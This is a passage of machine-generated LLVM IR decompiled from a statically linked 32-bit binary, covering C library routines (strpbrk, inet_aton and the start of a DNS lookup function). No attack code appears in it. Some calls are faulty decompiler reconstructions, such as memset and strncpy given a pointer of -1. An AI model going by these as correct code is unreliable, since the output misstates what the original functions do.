  %v8_8052747 = call i32 @rawmemchr(i8* %v5_8052746, i32 0, i32 %v8_8052736, i32 %v8_8052736)
  br label %dec_label_pc_8052755

dec_label_pc_8052751:                             ; preds = %dec_label_pc_8052732
  %v9_8052736 = inttoptr i32 %v8_8052736 to i8*
  store i8 0, i8* %v9_8052736, align 1
  %v2_8052754 = add i32 %v8_8052736, 1
  br label %dec_label_pc_8052755

dec_label_pc_8052755:                             ; preds = %dec_label_pc_8052742, %dec_label_pc_8052751
  %storemerge = phi i32 [ %v2_8052754, %dec_label_pc_8052751 ], [ %v8_8052747, %dec_label_pc_8052742 ]
  %v0_8052755 = phi i32 [ %v2_8052754, %dec_label_pc_8052751 ], [ %v8_8052747, %dec_label_pc_8052742 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_8052755 = load i32, i32* @esi, align 4
  %v2_8052755 = inttoptr i32 %v1_8052755 to i32*
  store i32 %v0_8052755, i32* %v2_8052755, align 4
  %v0_8052757 = load i32, i32* @ebx, align 4
  store i32 %v0_8052757, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052759

dec_label_pc_8052759:                             ; preds = %dec_label_pc_805272c, %dec_label_pc_8052755
  %v0_805275c = phi i32 [ %v0_805275c.pre, %dec_label_pc_805272c ], [ %v0_8052757, %dec_label_pc_8052755 ]
  %v2_8052759 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8052759, i32* @ebx, align 4
  store i32 %v0_8052705, i32* @esi, align 4
  store i32 %v0_8052704, i32* @edi, align 4
  ret i32 %v0_805275c

; uselistorder directives
  uselistorder i32 %v8_8052736, { 3, 5, 0, 1, 2, 4 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8052759, { 1, 0 }
  uselistorder label %dec_label_pc_8052755, { 1, 0 }
  uselistorder label %dec_label_pc_8052719, { 1, 0 }
}

define i32 @__GI_strpbrk(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_8052761 = load i32, i32* @ebx, align 4
  %v2_805277824 = load i8, i8* %arg1, align 1
  %v4_805277a28 = icmp eq i8 %v2_805277824, 0
  br i1 %v4_805277a28, label %dec_label_pc_8052782, label %dec_label_pc_805277e.lr.ph

dec_label_pc_805277e.lr.ph:                       ; preds = %entry
  %v3_805277825 = zext i8 %v2_805277824 to i32
  %v5_805277826 = and i32 %v0_8052761, -256
  %v6_805277827 = or i32 %v3_805277825, %v5_805277826
  %v4_8052766 = ptrtoint i8* %arg1 to i32
  %v1_805277113 = inttoptr i32 %arg2 to i8*
  %v4_8052771.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_805277e

dec_label_pc_805276c:                             ; preds = %dec_label_pc_805277e, %dec_label_pc_8052770
  %v6_805277122 = phi i32 [ %v6_8052771, %dec_label_pc_8052770 ], [ %v6_805277117, %dec_label_pc_805277e ]
  %v2_805277121 = phi i8 [ %v2_8052771, %dec_label_pc_8052770 ], [ %v2_805277114, %dec_label_pc_805277e ]
  %v0_805277020 = phi i32 [ %v1_8052770, %dec_label_pc_8052770 ], [ %arg2, %dec_label_pc_805277e ]
  %v15_805276c = icmp eq i8 %v2_805277121, %v2_805277831
  br i1 %v15_805276c, label %dec_label_pc_8052784, label %dec_label_pc_8052770

dec_label_pc_8052770:                             ; preds = %dec_label_pc_805276c
  %v1_8052770 = add i32 %v0_805277020, 1
  store i32 %v1_8052770, i32* @edx, align 4
  %v1_8052771 = inttoptr i32 %v1_8052770 to i8*
  %v2_8052771 = load i8, i8* %v1_8052771, align 1
  %v3_8052771 = zext i8 %v2_8052771 to i32
  %v5_8052771 = and i32 %v6_805277122, -256
  %v6_8052771 = or i32 %v3_8052771, %v5_8052771
  store i32 %v6_8052771, i32* @ecx, align 4
  %v4_8052773 = icmp eq i8 %v2_8052771, 0
  %v1_8052775 = icmp eq i1 %v4_8052773, false
  br i1 %v1_8052775, label %dec_label_pc_805276c, label %dec_label_pc_8052777

dec_label_pc_8052777:                             ; preds = %dec_label_pc_8052770, %dec_label_pc_805277e
  %v4_8052771.pre34 = phi i32 [ %v6_805277117, %dec_label_pc_805277e ], [ %v6_8052771, %dec_label_pc_8052770 ]
  %v1_8052777 = add i32 %v0_805277729, 1
  %v1_8052778 = inttoptr i32 %v1_8052777 to i8*
  %v2_8052778 = load i8, i8* %v1_8052778, align 1
  %v3_8052778 = zext i8 %v2_8052778 to i32
  %v5_8052778 = and i32 %v6_805277832, -256
  %v6_8052778 = or i32 %v3_8052778, %v5_8052778
  %v4_805277a = icmp eq i8 %v2_8052778, 0
  br i1 %v4_805277a, label %dec_label_pc_8052782, label %dec_label_pc_805277e

dec_label_pc_805277e:                             ; preds = %dec_label_pc_805277e.lr.ph, %dec_label_pc_8052777
  %v4_8052771.pre = phi i32 [ %v4_8052771.pre.pre, %dec_label_pc_805277e.lr.ph ], [ %v4_8052771.pre34, %dec_label_pc_8052777 ]
  %v6_805277832 = phi i32 [ %v6_805277827, %dec_label_pc_805277e.lr.ph ], [ %v6_8052778, %dec_label_pc_8052777 ]
  %v2_805277831 = phi i8 [ %v2_805277824, %dec_label_pc_805277e.lr.ph ], [ %v2_8052778, %dec_label_pc_8052777 ]
  %v0_805277729 = phi i32 [ %v4_8052766, %dec_label_pc_805277e.lr.ph ], [ %v1_8052777, %dec_label_pc_8052777 ]
  store i32 %arg2, i32* @edx, align 4
  %v2_805277114 = load i8, i8* %v1_805277113, align 1
  %v3_805277115 = zext i8 %v2_805277114 to i32
  %v5_805277116 = and i32 %v4_8052771.pre, -256
  %v6_805277117 = or i32 %v3_805277115, %v5_805277116
  store i32 %v6_805277117, i32* @ecx, align 4
  %v4_805277318 = icmp eq i8 %v2_805277114, 0
  %v1_805277519 = icmp eq i1 %v4_805277318, false
  br i1 %v1_805277519, label %dec_label_pc_805276c, label %dec_label_pc_8052777

dec_label_pc_8052782:                             ; preds = %dec_label_pc_8052777, %entry
  br label %dec_label_pc_8052784

dec_label_pc_8052784:                             ; preds = %dec_label_pc_805276c, %dec_label_pc_8052782
  %v0_8052786 = phi i32 [ 0, %dec_label_pc_8052782 ], [ %v0_805277729, %dec_label_pc_805276c ]
  store i32 %v0_8052761, i32* @ebx, align 4
  ret i32 %v0_8052786

; uselistorder directives
  uselistorder i32 %v6_805277117, { 2, 0, 1 }
  uselistorder i8 %v2_805277114, { 1, 2, 0 }
  uselistorder i32 %v1_8052777, { 1, 0 }
  uselistorder i32 %v6_8052771, { 1, 2, 0 }
  uselistorder i8 %v2_8052771, { 1, 2, 0 }
  uselistorder i32 %v1_8052770, { 2, 1, 0 }
  uselistorder i8 %v2_805277824, { 0, 2, 1 }
  uselistorder i32 %v0_8052761, { 1, 0 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8052784, { 1, 0 }
  uselistorder label %dec_label_pc_805277e, { 1, 0 }
  uselistorder label %dec_label_pc_8052777, { 1, 0 }
}

define i32 @inet_aton(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_805278f = ptrtoint i8* %arg1 to i32
  store i32 %v4_805278f, i32* @ecx, align 4
  %v1_8052793 = icmp eq i8* %arg1, null
  br i1 %v1_8052793, label %dec_label_pc_8052814, label %dec_label_pc_8052797

dec_label_pc_8052797:                             ; preds = %entry
  %v0_80527a5.pre = load i32, i32* @global_var_8058218, align 8
  br label %dec_label_pc_80527a2

dec_label_pc_80527a2:                             ; preds = %dec_label_pc_8052797, %dec_label_pc_80527eb
  %v2_80527ee35 = phi i32 [ 1, %dec_label_pc_8052797 ], [ %v3_80527ee, %dec_label_pc_80527eb ]
  %v0_80527a234 = phi i32 [ %v4_805278f, %dec_label_pc_8052797 ], [ %v0_80527a23, %dec_label_pc_80527eb ]
  %v0_805280933 = phi i32 [ 0, %dec_label_pc_8052797 ], [ %v2_80527f1, %dec_label_pc_80527eb ]
  %v1_80527a2 = inttoptr i32 %v0_80527a234 to i8*
  %v2_80527a2 = load i8, i8* %v1_80527a2, align 1
  %v3_80527a2 = sext i8 %v2_80527a2 to i32
  %v2_80527ab = mul nsw i32 %v3_80527a2, 2
  %v3_80527ab = add i32 %v2_80527ab, %v0_80527a5.pre
  %v4_80527ab = inttoptr i32 %v3_80527ab to i8*
  %v5_80527ab = load i8, i8* %v4_80527ab, align 1
  %v6_80527ab = and i8 %v5_80527ab, 8
  %v7_80527ab = icmp eq i8 %v6_80527ab, 0
  br i1 %v7_80527ab, label %dec_label_pc_8052814, label %dec_label_pc_80527b2

dec_label_pc_80527b2:                             ; preds = %dec_label_pc_80527a2
  %v4_80527c6.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_80527c6

dec_label_pc_80527b6:                             ; preds = %dec_label_pc_80527c6
  %v3_80527b6 = mul i32 %v1_80527b6, 10
  %v2_80527b9 = add i32 %v3_80527b6, -48
  %v3_80527b9 = add i32 %v2_80527b9, %v2_80527c8
  %v1_80527bd = add i32 %v3_80527b9, -255
  %v6_80527bd = sub i32 254, %v3_80527b9
  %v7_80527bd = and i32 %v6_80527bd, %v3_80527b9
  %v8_80527bd = icmp slt i32 %v7_80527bd, 0
  %v9_80527bd = icmp eq i32 %v1_80527bd, 0
  %v10_80527bd = icmp slt i32 %v1_80527bd, 0
  %v3_80527c3 = icmp eq i1 %v10_80527bd, %v8_80527bd
  %v4_80527c3 = icmp eq i1 %v9_80527bd, false
  %v5_80527c3 = and i1 %v4_80527c3, %v3_80527c3
  br i1 %v5_80527c3, label %dec_label_pc_8052814, label %dec_label_pc_80527c5

dec_label_pc_80527c5:                             ; preds = %dec_label_pc_80527b6
  %v1_80527c5 = add i32 %v0_80527c5, 1
  store i32 %v1_80527c5, i32* @ecx, align 4
  br label %dec_label_pc_80527c6

dec_label_pc_80527c6:                             ; preds = %dec_label_pc_80527b2, %dec_label_pc_80527c5
  %v1_80527b6 = phi i32 [ 0, %dec_label_pc_80527b2 ], [ %v3_80527b9, %dec_label_pc_80527c5 ]
  %v4_80527c6 = phi i32 [ %v4_80527c6.pre, %dec_label_pc_80527b2 ], [ %v6_80527c6, %dec_label_pc_80527c5 ]
  %v0_80527c5 = phi i32 [ %v0_80527a234, %dec_label_pc_80527b2 ], [ %v1_80527c5, %dec_label_pc_80527c5 ]
  %v1_80527c6 = inttoptr i32 %v0_80527c5 to i8*
  %v2_80527c6 = load i8, i8* %v1_80527c6, align 1
  %v3_80527c6 = zext i8 %v2_80527c6 to i32
  %v5_80527c6 = and i32 %v4_80527c6, -256
  %v6_80527c6 = or i32 %v3_80527c6, %v5_80527c6
  store i32 %v6_80527c6, i32* @edx, align 4
  %v2_80527c8 = sext i8 %v2_80527c6 to i32
  %v2_80527cb = mul nsw i32 %v2_80527c8, 2
  %v3_80527cb = add i32 %v2_80527cb, %v0_80527a5.pre
  %v4_80527cb = inttoptr i32 %v3_80527cb to i16*
  %v5_80527cb = load i16, i16* %v4_80527cb, align 2
  %v2_80527d0 = and i16 %v5_80527cb, 8
  %v3_80527d0 = icmp eq i16 %v2_80527d0, 0
  %v1_80527d2 = icmp eq i1 %v3_80527d0, false
  br i1 %v1_80527d2, label %dec_label_pc_80527b6, label %dec_label_pc_80527d4

dec_label_pc_80527d4:                             ; preds = %dec_label_pc_80527c6
  %v8_80527d4 = sub nsw i32 2, %v2_80527ee35
  %v9_80527d4 = and i32 %v8_80527d4, %v2_80527ee35
  %v10_80527d4 = icmp slt i32 %v9_80527d4, 0
  %v11_80527d4 = icmp eq i32 %v2_80527ee35, 3
  %v12_80527d4 = icmp slt i32 %v2_80527ee35, 3
  %v3_80527d8 = icmp eq i1 %v12_80527d4, %v10_80527d4
  %v4_80527d8 = icmp eq i1 %v11_80527d4, false
  %v5_80527d8 = and i1 %v4_80527d8, %v3_80527d8
  br i1 %v5_80527d8, label %dec_label_pc_80527e2, label %dec_label_pc_80527da

dec_label_pc_80527da:                             ; preds = %dec_label_pc_80527d4
  %v10_80527da = icmp eq i8 %v2_80527c6, 46
  %v1_80527dd = icmp eq i1 %v10_80527da, false
  br i1 %v1_80527dd, label %dec_label_pc_8052814, label %dec_label_pc_80527df

dec_label_pc_80527df:                             ; preds = %dec_label_pc_80527da
  %v1_80527df = add i32 %v0_80527c5, 1
  store i32 %v1_80527df, i32* @ecx, align 4
  br label %dec_label_pc_80527eb

dec_label_pc_80527e2:                             ; preds = %dec_label_pc_80527d4
  %v1_80527e2 = add i32 %v0_80527c5, 1
  store i32 %v1_80527e2, i32* @ecx, align 4
  %v4_80527e3 = icmp eq i8 %v2_80527c6, 0
  br i1 %v4_80527e3, label %dec_label_pc_80527eb, label %dec_label_pc_80527e7

dec_label_pc_80527e7:                             ; preds = %dec_label_pc_80527e2
  %v2_80527e7 = and i16 %v5_80527cb, 32
  %v3_80527e7 = icmp eq i16 %v2_80527e7, 0
  br i1 %v3_80527e7, label %dec_label_pc_8052814, label %dec_label_pc_80527eb

dec_label_pc_80527eb:                             ; preds = %dec_label_pc_80527e7, %dec_label_pc_80527e2, %dec_label_pc_80527df
  %v0_80527a23 = phi i32 [ %v1_80527e2, %dec_label_pc_80527e7 ], [ %v1_80527e2, %dec_label_pc_80527e2 ], [ %v1_80527df, %dec_label_pc_80527df ]
  %v2_80527eb = mul i32 %v0_805280933, 256
  %v3_80527ee = add nuw nsw i32 %v2_80527ee35, 1
  %v2_80527f1 = or i32 %v1_80527b6, %v2_80527eb
  %v7_80527f7 = icmp sgt i32 %v2_80527ee35, 3
  br i1 %v7_80527f7, label %dec_label_pc_80527f9, label %dec_label_pc_80527a2

dec_label_pc_80527f9:                             ; preds = %dec_label_pc_80527eb
  %v4_80527fe = icmp eq i32 %arg2, 0
  br i1 %v4_80527fe, label %dec_label_pc_8052816, label %dec_label_pc_8052805

dec_label_pc_8052805:                             ; preds = %dec_label_pc_80527f9
  %v1_8052809 = call i32 @llvm.bswap.i32(i32 %v2_80527f1)
  %v2_805280b = inttoptr i32 %arg2 to i32*
  store i32 %v1_8052809, i32* %v2_805280b, align 4
  br label %dec_label_pc_8052816

dec_label_pc_8052814:                             ; preds = %dec_label_pc_80527e7, %dec_label_pc_80527da, %dec_label_pc_80527a2, %dec_label_pc_80527b6, %entry
  br label %dec_label_pc_8052816

dec_label_pc_8052816:                             ; preds = %dec_label_pc_80527f9, %dec_label_pc_8052805, %dec_label_pc_8052814
  %v0_805281b = phi i32 [ 1, %dec_label_pc_80527f9 ], [ 1, %dec_label_pc_8052805 ], [ 0, %dec_label_pc_8052814 ]
  ret i32 %v0_805281b

; uselistorder directives
  uselistorder i32 %v2_80527c8, { 1, 0 }
  uselistorder i32 %v6_80527c6, { 1, 0 }
  uselistorder i8 %v2_80527c6, { 1, 0, 2, 3 }
  uselistorder i32 %v0_80527c5, { 0, 1, 3, 2 }
  uselistorder i32 %v1_80527bd, { 1, 0 }
  uselistorder i32 %v3_80527b9, { 1, 0, 3, 2 }
  uselistorder i32 %v0_80527a234, { 1, 0 }
  uselistorder i32 %v2_80527ee35, { 1, 4, 2, 0, 5, 3 }
  uselistorder i32 (i32)* @llvm.bswap.i32, { 3, 2, 1, 0 }
  uselistorder i32 254, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8052816, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8052814, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_80527c6, { 1, 0 }
  uselistorder label %dec_label_pc_80527a2, { 1, 0 }
}

define i32 @__dns_lookup(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp33 = sext i32 %arg2 to i64
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-236 = alloca i32, align 4
  %stack_var_-252 = alloca i8*, align 4
  store i32 %arg3, i32* @edi, align 4
  store i8* inttoptr (i32 512 to i8*), i8** %stack_var_-252, align 4
  %v2_8052832 = call i32 @malloc(i32 512)
  store i32 %v2_8052832, i32* %eax.global-to-local, align 4
  store i8* inttoptr (i32 1025 to i8*), i8** %stack_var_-252, align 4
  store i32 %v2_8052832, i32* @ebp, align 4
  %v2_8052840 = call i32 @malloc(i32 1025)
  store i32 %v2_8052840, i32* %eax.global-to-local, align 4
  %v12_8052849 = ptrtoint i32* %stack_var_-236 to i32
  %v1_805284c = icmp eq i32 %v2_8052832, 0
  br i1 %v1_805284c, label %dec_label_pc_8052ec5, label %dec_label_pc_8052854

dec_label_pc_8052854:                             ; preds = %entry
  %v1_8052854 = icmp eq i32 %v2_8052840, 0
  br i1 %v1_8052854, label %dec_label_pc_8052ec5, label %dec_label_pc_805285c

dec_label_pc_805285c:                             ; preds = %dec_label_pc_8052854
  %v5_805285c = icmp eq i32 %arg2, 0
  br i1 %v5_805285c, label %dec_label_pc_8052ec5, label %dec_label_pc_805286a

dec_label_pc_805286a:                             ; preds = %dec_label_pc_805285c
  %v4_805286a = ptrtoint i8* %arg1 to i32
  store i32 %v4_805286a, i32* %eax.global-to-local, align 4
  %v2_8052871 = load i8, i8* %arg1, align 1
  %v3_8052871 = icmp eq i8 %v2_8052871, 0
  br i1 %v3_8052871, label %dec_label_pc_8052ec5, label %dec_label_pc_805287a

dec_label_pc_805287a:                             ; preds = %dec_label_pc_805286a
  store i8* %arg1, i8** %stack_var_-252, align 4
  %v3_805287e = call i32 @strlen(i8* nonnull %arg1)
  store i32 %v3_805287e, i32* @eax, align 4
  store i32 %v4_805286a, i32* %edx.global-to-local, align 4
  %v2_80528a1 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_80528a1, i32* @ebx, align 4
  %tmp46 = bitcast i32* %stack_var_-52 to i8*
  store i8* %tmp46, i8** %stack_var_-252, align 4
  %v3_80528a9 = call i32 @__pthread_return_void(i32 %v2_80528a1, i32 134550743)
  store i32 %v3_80528a9, i32* %eax.global-to-local, align 4
  store i8* bitcast (i8** @global_var_805e728.268 to i8*), i8** %stack_var_-252, align 4
  %v2_80528b5 = call i32 @__pthread_return_0(i32 ptrtoint (i8** @global_var_805e728.268 to i32))
  %v0_80528ba = load i64, i64* @global_var_805e740.269, align 8
  %v1_80528ba = trunc i64 %v0_80528ba to i32
  %v1_80528bf = ashr i32 %v1_80528ba, 31
  %v6_80528c0 = and i64 %v0_80528ba, 4294967295
  %v8_80528c0 = zext i32 %v1_80528bf to i64
  %v9_80528c0 = mul nuw i64 %v8_80528c0, 4294967296
  %v10_80528c0 = or i64 %v9_80528c0, %v6_80528c0
  %v14_80528c0 = srem i64 %v10_80528c0, %tmp33
  %v15_80528c0 = trunc i64 %v14_80528c0 to i32
  %v0_80528c7 = load i16, i16* @global_var_8058484.270, align 4
  %v2_80528d6 = load i8*, i8** %stack_var_-252, align 4
  %v3_80528d6 = ptrtoint i8* %v2_80528d6 to i32
  store i32 %v3_80528d6, i32* @eax, align 4
  store i32 134550743, i32* %edx.global-to-local, align 4
  store i8* %tmp46, i8** %stack_var_-252, align 4
  %v3_80528db = call i32 @__pthread_return_void(i32 %v2_80528a1, i32 1)
  store i32 %v3_80528db, i32* %eax.global-to-local, align 4
  %v3_805291f = sext i16 %v0_80528c7 to i32
  %v5_8052a82 = inttoptr i32 %v15_80528c0 to i8*
  %v1_8052ea087 = add i32 %v12_8052849, 28
  %v2_8052ea088 = inttoptr i32 %v1_8052ea087 to i32*
  %v3_8052ea089 = load i32, i32* %v2_8052ea088, align 4
  %tmp119 = icmp ult i32 %v3_8052ea089, 3
  br i1 %tmp119, label %dec_label_pc_8052900, label %dec_label_pc_8052ec5

dec_label_pc_8052900:                             ; preds = %dec_label_pc_805287a, %dec_label_pc_8052ea0.backedge
  %v0_805290792 = phi i32 [ %v0_8052ea0.pre, %dec_label_pc_8052ea0.backedge ], [ %v12_8052849, %dec_label_pc_805287a ]
  %v1_8052900 = add i32 %v0_805290792, 20
  %v2_8052900 = inttoptr i32 %v1_8052900 to i32*
  %v3_8052900 = load i32, i32* %v2_8052900, align 4
  %v13_8052900 = icmp eq i32 %v3_8052900, -1
  br i1 %v13_8052900, label %dec_label_pc_8052900.dec_label_pc_8052916_crit_edge, label %dec_label_pc_8052907

dec_label_pc_8052900.dec_label_pc_8052916_crit_edge: ; preds = %dec_label_pc_8052900
  %v0_8052916.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052916

dec_label_pc_8052907:                             ; preds = %dec_label_pc_8052900
  %v3_805290a = load i32, i32* %v2_8052900, align 4
  %v5_805290a = add i32 %v0_805290792, -16
  %v6_805290a = inttoptr i32 %v5_805290a to i32*
  store i32 %v3_805290a, i32* %v6_805290a, align 4
  %v1_805290e = call i32 @__libc_close(i32 -1)
  store i32 %v1_805290e, i32* %eax.global-to-local, align 4
  %v0_8052913 = load i32, i32* @esp, align 4
  %v1_8052913 = add i32 %v0_8052913, 16
  br label %dec_label_pc_8052916

dec_label_pc_8052916:                             ; preds = %dec_label_pc_8052900.dec_label_pc_8052916_crit_edge, %dec_label_pc_8052907
  %v1_8052916 = phi i32 [ %v0_805290792, %dec_label_pc_8052900.dec_label_pc_8052916_crit_edge ], [ %v1_8052913, %dec_label_pc_8052907 ]
  %v0_8052916 = phi i32 [ %v0_8052916.pre, %dec_label_pc_8052900.dec_label_pc_8052916_crit_edge ], [ %v1_805290e, %dec_label_pc_8052907 ]
  %v2_8052916 = add i32 %v1_8052916, -4
  %v3_8052916 = inttoptr i32 %v2_8052916 to i32*
  store i32 %v0_8052916, i32* %v3_8052916, align 4
  %v1_8052917 = add i32 %v1_8052916, -8
  %v2_8052917 = inttoptr i32 %v1_8052917 to i32*
  store i32 512, i32* %v2_8052917, align 4
  %v1_805291c = add i32 %v1_8052916, -12
  %v2_805291c = inttoptr i32 %v1_805291c to i32*
  store i32 0, i32* %v2_805291c, align 4
  %v2_805291e = add i32 %v1_8052916, -16
  %v3_805291e = inttoptr i32 %v2_805291e to i32*
  store i32 %v2_8052832, i32* %v3_805291e, align 4
  %v5_805291f = call i32 @__GI_memset(i8* inttoptr (i32 -1 to i8*), i32 %v15_80528c0, i32 %v3_805291f)
  store i32 %v5_805291f, i32* %eax.global-to-local, align 4
  %v0_8052924 = load i32, i32* @esp, align 4
  %v1_8052927 = add i32 %v0_8052924, 8
  %v2_8052927 = inttoptr i32 %v1_8052927 to i32*
  store i32 48, i32* %v2_8052927, align 4
  %v1_8052929 = add i32 %v0_8052924, 4
  %v2_8052929 = inttoptr i32 %v1_8052929 to i32*
  store i32 0, i32* %v2_8052929, align 4
  %v1_805292b = add i32 %v0_8052924, 84
  store i32 %v1_805292b, i32* @ebx, align 4
  %v3_805292f = inttoptr i32 %v0_8052924 to i32*
  store i32 %v1_805292b, i32* %v3_805292f, align 4
  %v5_8052930 = call i32 @__GI_memset(i8* inttoptr (i32 -1 to i8*), i32 %v15_80528c0, i32 %v3_805291f)
  store i32 %v5_8052930, i32* %eax.global-to-local, align 4
  %v0_8052935 = load i32, i32* @esp, align 4
  %v1_8052935 = add i32 %v0_8052935, 60
  %v2_8052935 = inttoptr i32 %v1_8052935 to i32*
  %v3_8052935 = load i32, i32* %v2_8052935, align 4
  store i32 %v3_8052935, i32* %eax.global-to-local, align 4
  %v1_8052939 = add i32 %v0_8052935, 116
  %v2_8052939 = inttoptr i32 %v1_8052939 to i32*
  store i32 1, i32* %v2_8052939, align 4
  %v0_8052941 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052941 = add i32 %v0_8052941, 1
  %v0_8052942 = load i32, i32* @esp, align 4
  %v1_8052942 = add i32 %v0_8052942, 104
  %v2_8052942 = inttoptr i32 %v1_8052942 to i32*
  store i32 1, i32* %v2_8052942, align 4
  %v1_805294a = urem i32 %v1_8052941, 65536
  store i32 %v1_805294a, i32* %eax.global-to-local, align 4
  %v1_805294f = load i32, i32* @esp, align 4
  %v2_805294f = add i32 %v1_805294f, 60
  %v3_805294f = inttoptr i32 %v2_805294f to i32*
  store i32 %v1_805294a, i32* %v3_805294f, align 4
  %v0_8052953 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052953 = load i32, i32* @esp, align 4
  %v2_8052953 = add i32 %v1_8052953, 84
  %v3_8052953 = inttoptr i32 %v2_8052953 to i32*
  store i32 %v0_8052953, i32* %v3_8052953, align 4
  %v0_8052957 = load i32, i32* @esp, align 4
  %v1_805295a = add i32 %v0_8052957, 8
  %v2_805295a = inttoptr i32 %v1_805295a to i32*
  store i32 512, i32* %v2_805295a, align 4
  %v2_805295f = add i32 %v0_8052957, 4
  %v3_805295f = inttoptr i32 %v2_805295f to i32*
  store i32 %v2_8052832, i32* %v3_805295f, align 4
  %v0_8052960 = load i32, i32* @ebx, align 4
  %v3_8052960 = inttoptr i32 %v0_8052957 to i32*
  store i32 %v0_8052960, i32* %v3_8052960, align 4
  %v0_8052961 = call i32 @__encode_header()
  store i32 %v0_8052961, i32* %eax.global-to-local, align 4
  %v0_8052966 = load i32, i32* @esp, align 4
  store i32 %v0_8052961, i32* @ebx, align 4
  %v2_805296b = icmp slt i32 %v0_8052961, 0
  br i1 %v2_805296b, label %dec_label_pc_8052ec5, label %dec_label_pc_8052973

dec_label_pc_8052973:                             ; preds = %dec_label_pc_8052916
  %v2_8052973 = add i32 %v0_8052966, 12
  %v3_8052973 = inttoptr i32 %v2_8052973 to i32*
  store i32 %v0_8052961, i32* %v3_8052973, align 4
  %v1_8052974 = add i32 %v0_8052966, 8
  %v2_8052974 = inttoptr i32 %v1_8052974 to i32*
  store i32 1025, i32* %v2_8052974, align 4
  %v1_8052979 = add i32 %v0_8052966, 256
  %v2_8052979 = inttoptr i32 %v1_8052979 to i32*
  %v3_8052979 = load i32, i32* %v2_8052979, align 4
  %v5_8052979 = add i32 %v0_8052966, 4
  %v6_8052979 = inttoptr i32 %v5_8052979 to i32*
  store i32 %v3_8052979, i32* %v6_8052979, align 4
  %v1_8052980 = add i32 %v0_8052966, 28
  %v2_8052980 = inttoptr i32 %v1_8052980 to i32*
  %v3_8052980 = load i32, i32* %v2_8052980, align 4
  %v6_8052980 = inttoptr i32 %v0_8052966 to i32*
  store i32 %v3_8052980, i32* %v6_8052980, align 4
  %v5_8052984 = call i32 @strncpy(i8* inttoptr (i32 -1 to i8*), i32 %v15_80528c0, i32 %v3_805291f)
  %v0_8052989 = load i32, i32* @esp, align 4
  %v1_805298c = add i32 %v0_8052989, 8
  %v2_805298c = inttoptr i32 %v1_805298c to i32*
  store i32 ptrtoint (i32* @global_var_8058488.210 to i32), i32* %v2_805298c, align 4
  %v1_8052991 = add i32 %v0_8052989, 4
  %v2_8052991 = inttoptr i32 %v1_8052991 to i32*
  store i32 134550743, i32* %v2_8052991, align 4
  %v1_8052996 = add i32 %v0_8052989, 200
  store i32 %v1_8052996, i32* @eax, align 4
  %v3_805299d = inttoptr i32 %v0_8052989 to i32*
  store i32 %v1_8052996, i32* %v3_805299d, align 4
  %v2_805299e = call i32 @__pthread_return_void(i32 -1, i32 %v15_80528c0)
  store i32 %v2_805299e, i32* %eax.global-to-local, align 4
  %v0_80529a3 = load i32, i32* @esp, align 4
  %v1_80529a3 = inttoptr i32 %v0_80529a3 to i32*
  store i32 ptrtoint (i32* @global_var_8058488.210 to i32), i32* %v1_80529a3, align 4
  %v1_80529aa = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_80529aa, i32* %eax.global-to-local, align 4
  %v0_80529af = load i32, i32* @esp, align 4
  %v1_80529af = add i32 %v0_80529af, 56
  %v2_80529af = inttoptr i32 %v1_80529af to i32*
  %v3_80529af = load i32, i32* %v2_80529af, align 4
  store i32 %v3_80529af, i32* %edx.global-to-local, align 4
  %v1_80529b3 = add i32 %v0_80529af, 268
  %v2_80529b3 = inttoptr i32 %v1_80529b3 to i32*
  %v3_80529b3 = load i32, i32* %v2_80529b3, align 4
  store i32 %v3_80529b3, i32* %eax.global-to-local, align 4
  %v2_80529ba = mul i32 %v3_80529af, 4
  %v3_80529ba = add i32 %v3_80529b3, %v2_80529ba
  %v4_80529ba = inttoptr i32 %v3_80529ba to i32*
  %v5_80529ba = load i32, i32* %v4_80529ba, align 4
  store i32 %v5_80529ba, i32* %edx.global-to-local, align 4
  %v2_80529bd = add i32 %v0_80529af, 48
  %v3_80529bd = inttoptr i32 %v2_80529bd to i32*
  store i32 %v5_80529ba, i32* %v3_80529bd, align 4
  %v0_80529c1 = load i32, i32* @esp, align 4
  %v1_80529c1 = add i32 %v0_80529c1, 16
  %v1_80529c4 = add i32 %v0_80529c1, 52
  %v2_80529c4 = inttoptr i32 %v1_80529c4 to i32*
  %v3_80529c4 = load i32, i32* %v2_80529c4, align 4
  %v5_80529c4 = icmp slt i32 %v3_80529c4, 0
  br i1 %v5_80529c4, label %dec_label_pc_8052973.dec_label_pc_8052a0a_crit_edge, label %dec_label_pc_80529cb

dec_label_pc_8052973.dec_label_pc_8052a0a_crit_edge: ; preds = %dec_label_pc_8052973
  %v0_8052a0a.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052a0a

dec_label_pc_80529cb:                             ; preds = %dec_label_pc_8052973
  store i32 %v3_80529c4, i32* %eax.global-to-local, align 4
  %v1_80529cf = load i32, i32* @global_var_805eb78.271, align 8
  %v2_80529cf = sub i32 %v3_80529c4, %v1_80529cf
  %v8_80529cf = xor i32 %v1_80529cf, %v3_80529c4
  %v9_80529cf = xor i32 %v2_80529cf, %v3_80529c4
  %v10_80529cf = and i32 %v9_80529cf, %v8_80529cf
